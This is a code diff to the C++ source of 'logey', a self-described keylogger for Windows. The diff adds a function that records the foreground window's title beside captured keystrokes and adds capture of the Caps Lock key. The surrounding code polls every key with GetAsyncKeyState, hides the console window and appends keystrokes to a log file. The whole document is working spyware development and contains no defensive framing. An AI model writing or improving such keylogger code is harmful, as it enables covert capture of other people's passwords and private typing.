@@ -11,6 +11,7 @@ int main() {
 	while (true) {
 		for (int key = 8; key < 256; key++) {
 			if (GetAsyncKeyState(key) == -32767) { // Check the state of a key
+				addWindowTitle(filename);
 				captureKey(key, filename); // Capture this key
 			}
 		}
@@ -53,6 +54,9 @@ void captureKey(int key, std::string filename) {
 	case VK_DELETE:
 		description = "{DEL}";
 		break;
+	case VK_CAPITAL:
+		description = "{CAPSLOCK}";
+		break;
 	case 190:
 		description = ".";
 		break;
@@ -87,7 +91,7 @@ void hideConsole() {
 
 void createFileHeader(std::string filename) {
 	if (!fileExists(filename)) {
-		std::ofstream file(filename, std::ios_base::app);
+		std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode
 		file << "--------------------------------" << std::endl;
 		file << "logey -- A keylogger for Windows" << std::endl;
 		file << "author: exler" << std::endl;
@@ -99,7 +103,7 @@ void createFileHeader(std::string filename) {
 }
 
 void createTimeStamp(std::string filename) {
-	std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode
+	std::ofstream file(filename, std::ios_base::app);
 
 	char str[26];
 	auto time = std::chrono::system_clock::now();
@@ -110,7 +114,23 @@ void createTimeStamp(std::string filename) {
 	file << "Session timestamp: " << str;
 	file << "--------------------------------" << std::endl;
 
-	file.close(); // Close the log file as soon as possible
+	file.close();
+}
+
+void addWindowTitle(std::string filename) {
+	std::ofstream file(filename, std::ios_base::app);
+
+	static std::string activeWindowTitle = "";
+	char windowTitle[256];
+	HWND activeWindow = GetForegroundWindow(); // Get handle of currently active window
+
+	GetWindowText(activeWindow, windowTitle, sizeof(windowTitle));
+	if (activeWindowTitle != windowTitle) {
+		file << "\nActive window: " << windowTitle << std::endl;
+		file << "--------------------------------" << std::endl;
+		activeWindowTitle = windowTitle;
+		file.close();
+	}
 }
 
 bool fileExists(std::string filename) {
